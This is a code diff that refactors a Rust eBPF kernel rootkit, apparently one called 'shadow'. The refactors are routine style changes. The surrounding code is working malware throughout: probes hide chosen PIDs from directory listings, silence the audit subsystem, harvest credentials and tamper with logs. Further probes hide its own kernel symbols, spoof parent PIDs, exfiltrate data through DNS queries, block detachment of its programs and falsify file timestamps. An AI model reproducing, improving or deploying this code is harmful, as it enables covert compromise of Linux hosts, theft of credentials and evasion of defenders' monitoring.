@@ -165,10 +165,7 @@ static DNS_EXFIL_SEQ: HashMap<u32, u32> = HashMap::with_max_entries(1, 0);
 /// Kernel entry: capture buffer pointer argument.
 #[kprobe]
 pub fn shadow_getdents64_enter(ctx: ProbeContext) -> u32 {
-    match try_getdents64_enter(&ctx) {
-        Ok(ret) => ret,
-        Err(_) => 0,
-    }
+    try_getdents64_enter(&ctx).unwrap_or_default()
 }
 
 fn try_getdents64_enter(ctx: &ProbeContext) -> Result<u32, i64> {
@@ -181,10 +178,7 @@ fn try_getdents64_enter(ctx: &ProbeContext) -> Result<u32, i64> {
 /// Kernel return: iterate entries and hide matching PIDs.
 #[kretprobe]
 pub fn shadow_getdents64_exit(ctx: RetProbeContext) -> u32 {
-    match try_getdents64_exit(&ctx) {
-        Ok(ret) => ret,
-        Err(_) => 0,
-    }
+    try_getdents64_exit(&ctx).unwrap_or_default()
 }
 
 fn try_getdents64_exit(ctx: &RetProbeContext) -> Result<u32, i64> {
@@ -235,31 +229,29 @@ fn try_getdents64_exit(ctx: &RetProbeContext) -> Result<u32, i64> {
 
         let pid = parse_pid_from_name(&d_name);
 
-        if pid > 0 {
-            if unsafe { HIDDEN_PIDS.get(&pid).is_some() } {
-                if prev_reclen_ptr != 0 {
-                    let new_reclen = prev_reclen_val + d_reclen;
-                    unsafe {
-                        let _ = bpf_probe_write_user(
-                            prev_reclen_ptr as *mut u16,
-                            &new_reclen as *const u16,
-                        );
-                    }
-                    prev_reclen_val = new_reclen;
-                } else {
-                    let dot_name: [u8; 2] = [b'.', 0];
-                    unsafe {
-                        let _ = bpf_probe_write_user(
-                            (entry_ptr + 19) as *mut [u8; 2],
-                            &dot_name as *const [u8; 2],
-                        );
-                    }
-                    prev_reclen_ptr = reclen_ptr;
-                    prev_reclen_val = d_reclen;
+        if pid > 0 && unsafe { HIDDEN_PIDS.get(&pid).is_some() } {
+            if prev_reclen_ptr != 0 {
+                let new_reclen = prev_reclen_val + d_reclen;
+                unsafe {
+                    let _ = bpf_probe_write_user(
+                        prev_reclen_ptr as *mut u16,
+                        &new_reclen as *const u16,
+                    );
                 }
-                offset += d_reclen as u64;
-                continue;
+                prev_reclen_val = new_reclen;
+            } else {
+                let dot_name: [u8; 2] = [b'.', 0];
+                unsafe {
+                    let _ = bpf_probe_write_user(
+                        (entry_ptr + 19) as *mut [u8; 2],
+                        &dot_name as *const [u8; 2],
+                    );
+                }
+                prev_reclen_ptr = reclen_ptr;
+                prev_reclen_val = d_reclen;
             }
+            offset += d_reclen as u64;
+            continue;
         }
 
         prev_reclen_ptr = reclen_ptr;
@@ -279,7 +271,7 @@ fn parse_pid_from_name(name: &[u8; 16]) -> u32 {
         if c == 0 {
             break;
         }
-        if c < b'0' || c > b'9' {
+        if !(b'0'..=b'9').contains(&c) {
             return 0;
         }
         pid = pid * 10 + (c - b'0') as u32;
@@ -481,10 +473,7 @@ fn compute_c2_hmac(data: *const u8, len: usize) -> [u8; 16] {
 
 #[kprobe]
 pub fn shadow_vfs_read(ctx: ProbeContext) -> u32 {
-    match try_shadow_vfs_read(&ctx) {
-        Ok(ret) => ret,
-        Err(_) => 0,
-    }
+    try_shadow_vfs_read(&ctx).unwrap_or_default()
 }
 
 fn try_shadow_vfs_read(ctx: &ProbeContext) -> Result<u32, i64> {
@@ -574,10 +563,7 @@ fn try_shadow_vfs_read(ctx: &ProbeContext) -> Result<u32, i64> {
 
 #[kprobe]
 pub fn shadow_mute_audit(ctx: ProbeContext) -> u32 {
-    match try_mute_audit(&ctx) {
-        Ok(ret) => ret,
-        Err(_) => 0,
-    }
+    try_mute_audit(&ctx).unwrap_or_default()
 }
 
 fn try_mute_audit(_ctx: &ProbeContext) -> Result<u32, i64> {
@@ -600,10 +586,7 @@ fn try_mute_audit(_ctx: &ProbeContext) -> Result<u32, i64> {
 
 #[kprobe]
 pub fn shadow_mute_audit_log_end(ctx: ProbeContext) -> u32 {
-    match try_mute_audit_log_end(&ctx) {
-        Ok(ret) => ret,
-        Err(_) => 0,
-    }
+    try_mute_audit_log_end(&ctx).unwrap_or_default()
 }
 
 fn try_mute_audit_log_end(_ctx: &ProbeContext) -> Result<u32, i64> {
@@ -636,10 +619,7 @@ fn try_mute_audit_log_end(_ctx: &ProbeContext) -> Result<u32, i64> {
 
 #[kprobe]
 pub fn shadow_cred_harvest(ctx: ProbeContext) -> u32 {
-    match try_cred_harvest(&ctx) {
-        Ok(ret) => ret,
-        Err(_) => 0,
-    }
+    try_cred_harvest(&ctx).unwrap_or_default()
 }
 
 fn try_cred_harvest(ctx: &ProbeContext) -> Result<u32, i64> {
@@ -719,10 +699,7 @@ pub fn shadow_tamper_logs_enter(ctx: ProbeContext) -> u32 {
 
 #[kretprobe]
 pub fn shadow_tamper_logs(ctx: RetProbeContext) -> u32 {
-    match try_tamper_logs(&ctx) {
-        Ok(ret) => ret,
-        Err(_) => 0,
-    }
+    try_tamper_logs(&ctx).unwrap_or_default()
 }
 
 fn try_tamper_logs(_ctx: &RetProbeContext) -> Result<u32, i64> {
@@ -760,10 +737,10 @@ fn try_tamper_logs(_ctx: &RetProbeContext) -> Result<u32, i64> {
         }
     }
 
-    let pattern: [u8; 7] = [b's', b'h', b'a', b'd', b'o', b'w', b'_'];
+    let pattern: [u8; 7] = *b"shadow_";
 
     let mut i = 0usize;
-    let max_scan = if scan_len > 7 { scan_len - 7 } else { 0 };
+    let max_scan = scan_len.saturating_sub(7);
 
     while i < max_scan {
         if i >= 2041 {
@@ -834,10 +811,7 @@ fn try_tamper_logs(_ctx: &RetProbeContext) -> Result<u32, i64> {
 
 #[kretprobe]
 pub fn shadow_spoof_ancestry(ctx: RetProbeContext) -> u32 {
-    match try_spoof_ancestry(&ctx) {
-        Ok(ret) => ret,
-        Err(_) => 0,
-    }
+    try_spoof_ancestry(&ctx).unwrap_or_default()
 }
 
 fn try_spoof_ancestry(_ctx: &RetProbeContext) -> Result<u32, i64> {
@@ -874,9 +848,9 @@ fn try_spoof_ancestry(_ctx: &RetProbeContext) -> Result<u32, i64> {
         }
     }
 
-    let ppid_pattern: [u8; 6] = [b'P', b'P', b'i', b'd', b':', b'\t'];
+    let ppid_pattern: [u8; 6] = *b"PPid:\t";
 
-    let max_scan = if scan_len > 6 { scan_len - 6 } else { 0 };
+    let max_scan = scan_len.saturating_sub(6);
     let mut ppid_offset: usize = 0;
     let mut found = false;
 
@@ -903,7 +877,7 @@ fn try_spoof_ancestry(_ctx: &RetProbeContext) -> Result<u32, i64> {
         return Ok(0);
     }
 
-    let pid_pattern: [u8; 5] = [b'P', b'i', b'd', b':', b'\t'];
+    let pid_pattern: [u8; 5] = *b"Pid:\t";
     let mut target_pid: u32 = 0;
     let mut j = 0usize;
     while j < max_scan {
@@ -1003,10 +977,7 @@ fn try_spoof_ancestry(_ctx: &RetProbeContext) -> Result<u32, i64> {
 
 #[aya_ebpf::macros::classifier]
 pub fn shadow_dns_exfil(ctx: aya_ebpf::programs::TcContext) -> i32 {
-    match try_dns_exfil(&ctx) {
-        Ok(action) => action,
-        Err(_) => 0,
-    }
+    try_dns_exfil(&ctx).unwrap_or_default()
 }
 
 fn try_dns_exfil(ctx: &aya_ebpf::programs::TcContext) -> Result<i32, i64> {
@@ -1061,10 +1032,7 @@ fn try_dns_exfil(ctx: &aya_ebpf::programs::TcContext) -> Result<i32, i64> {
         return Ok(0);
     }
 
-    let hex_chars: [u8; 16] = [
-        b'0', b'1', b'2', b'3', b'4', b'5', b'6', b'7', b'8', b'9', b'a', b'b', b'c', b'd', b'e',
-        b'f',
-    ];
+    let hex_chars: [u8; 16] = *b"0123456789abcdef";
 
     let label_len_byte = [hex_label_len as u8];
     let _ = unsafe {
@@ -1111,7 +1079,7 @@ fn try_dns_exfil(ctx: &aya_ebpf::programs::TcContext) -> Result<i32, i64> {
         timestamp_ns: unsafe { bpf_ktime_get_ns() },
         context: seq as u64,
     };
-    let _ = EVENTS.output(ctx, &event, 0);
+    EVENTS.output(ctx, &event, 0);
 
     Ok(0)
 }
@@ -1122,10 +1090,7 @@ fn try_dns_exfil(ctx: &aya_ebpf::programs::TcContext) -> Result<i32, i64> {
 
 #[kretprobe]
 pub fn shadow_hide_kallsyms(ctx: RetProbeContext) -> u32 {
-    match try_hide_kallsyms(&ctx) {
-        Ok(ret) => ret,
-        Err(_) => 0,
-    }
+    try_hide_kallsyms(&ctx).unwrap_or_default()
 }
 
 fn try_hide_kallsyms(_ctx: &RetProbeContext) -> Result<u32, i64> {
@@ -1170,8 +1135,8 @@ fn try_hide_kallsyms(_ctx: &RetProbeContext) -> Result<u32, i64> {
         }
     }
 
-    let pattern: [u8; 7] = [b's', b'h', b'a', b'd', b'o', b'w', b'_'];
-    let max_scan = if scan_len > 7 { scan_len - 7 } else { 0 };
+    let pattern: [u8; 7] = *b"shadow_";
+    let max_scan = scan_len.saturating_sub(7);
 
     let mut i = 0usize;
     let mut modified = false;
@@ -1251,10 +1216,7 @@ const BPF_LINK_DETACH: u32 = 34;
 
 #[aya_ebpf::macros::tracepoint]
 pub fn shadow_anti_detach(ctx: aya_ebpf::programs::TracePointContext) -> u32 {
-    match try_anti_detach(&ctx) {
-        Ok(ret) => ret,
-        Err(_) => 0,
-    }
+    try_anti_detach(&ctx).unwrap_or_default()
 }
 
 fn try_anti_detach(ctx: &aya_ebpf::programs::TracePointContext) -> Result<u32, i64> {
@@ -1420,10 +1382,7 @@ pub fn shadow_timestomp_enter(ctx: ProbeContext) -> u32 {
 
 #[kretprobe]
 pub fn shadow_timestomp(ctx: RetProbeContext) -> u32 {
-    match try_timestomp(&ctx) {
-        Ok(ret) => ret,
-        Err(_) => 0,
-    }
+    try_timestomp(&ctx).unwrap_or_default()
 }
 
 fn try_timestomp(_ctx: &RetProbeContext) -> Result<u32, i64> {
